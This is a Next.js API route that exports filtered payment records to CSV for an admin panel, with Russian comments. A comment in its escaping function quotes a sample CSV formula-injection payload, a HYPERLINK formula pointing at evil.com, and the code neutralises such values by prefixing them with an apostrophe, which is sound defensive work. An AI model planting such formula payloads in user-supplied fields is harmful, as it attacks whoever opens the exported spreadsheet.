import { NextRequest, NextResponse } from 'next/server'
import { requireSession } from '@/lib/auth'
import { searchPayments, type PaymentRow } from '@/lib/db'

/**
 * GET /api/payments/export?method=&plan=&days=&hideRefunds=&q=
 *
 * B4: server-side CSV export. Использует те же фильтры что и /payments —
 * админ получает ровно то что видит на экране. Лимит увеличен до 10k
 * (page показывает 500), чтобы выгрузка за весь период не обрезалась.
 *
 * Поля: payment_id, created_at, user_id, username, method, plan,
 *       amount_rub, amount_stars, status, tx_id, refunded_at
 */

function csvEscape(v: unknown): string {
  if (v === null || v === undefined) return ''
  let s = String(v)
  // Audit fix 2026-05-24: CSV Formula Injection (CWE-1236). Если значение
  // начинается с `=`, `+`, `-`, `@`, TAB или CR — Excel/LibreOffice
  // интерпретирует ячейку как формулу и **исполняет её при открытии файла**.
  // Сценарий: юзер ставит first_name = `=HYPERLINK("http://evil.com")`,
  // админ открывает payments_2026-05-25.csv → Excel выполняет → drive-by.
  // Префикс апостроф нейтрализует это.
  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
    s = "'" + s
  }
  // Экранирование по RFC 4180: значения с `,`, `"`, `\n`, `\r` оборачиваем в `"`
  // и удваиваем внутренние `"`. Все остальные значения оставляем как есть.
  if (/[",\r\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`
  return s
}

type MethodFilter = 'stars' | 'crypto' | 'oxapay' | 'lavatop' | 'free' | 'admin_grant' | 'trial'

function parseMethod(s: string | null): MethodFilter | undefined {
  if (s === 'stars' || s === 'crypto' || s === 'oxapay' || s === 'lavatop'
    || s === 'free' || s === 'admin_grant' || s === 'trial') return s
  return undefined
}

export async function GET(req: NextRequest) {
  const session = await requireSession()
  if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const sp = req.nextUrl.searchParams
  const method = parseMethod(sp.get('method'))
  const plan = sp.get('plan') ?? undefined
  const daysRaw = sp.get('days')
  const days = daysRaw && /^\d+$/.test(daysRaw) ? parseInt(daysRaw, 10) : undefined
  const hideRefunds = sp.get('hideRefunds') === '1'
  const q = sp.get('q') ?? undefined

  const rows = searchPayments({
    method,
    plan: plan && plan.length < 50 ? plan : undefined,
    days,
    includeRefunds: !hideRefunds,
    q: q ? q.slice(0, 200) : undefined,
    limit: 10_000,
  })

  // Header + rows. tx_id = payment_id (для нашей схемы это синонимы:
  // subscriptions.payment_id хранит charge_id / invoice_id).
  const header = [
    'payment_id', 'created_at', 'user_id', 'username',
    'method', 'plan', 'amount_rub', 'amount_stars',
    'status', 'tx_id', 'refunded_at',
  ]
  const lines: string[] = [header.join(',')]
  for (const r of rows as PaymentRow[]) {
    lines.push([
      csvEscape(r.id),                  // payment_id (= subscription_id в нашей БД)
      csvEscape(r.created_at),
      csvEscape(r.user_id),
      csvEscape(r.username ?? ''),
      csvEscape(r.method),
      csvEscape(r.plan),
      csvEscape(r.amount_rub ?? 0),
      csvEscape(r.stars_paid ?? 0),
      csvEscape(r.status),
      csvEscape(r.payment_id ?? ''),
      csvEscape(r.refunded_at ?? ''),
    ].join(','))
  }
  // BOM для Excel — без него RU-cyrillic превращается в кракозябры.
  const body = '﻿' + lines.join('\n')
  const ts = new Date().toISOString().slice(0, 10)

  return new NextResponse(body, {
    status: 200,
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="payments_${ts}.csv"`,
      'Cache-Control': 'no-store',
    },
  })
}
